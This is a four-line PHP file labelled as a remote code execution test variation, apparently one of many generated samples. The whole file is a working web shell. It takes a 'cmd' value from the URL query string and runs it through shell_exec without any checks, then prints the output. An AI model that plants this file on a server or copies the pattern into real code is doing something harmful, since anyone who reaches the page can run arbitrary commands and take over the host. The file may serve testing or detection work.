<?php
// RCE test variation #1148
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>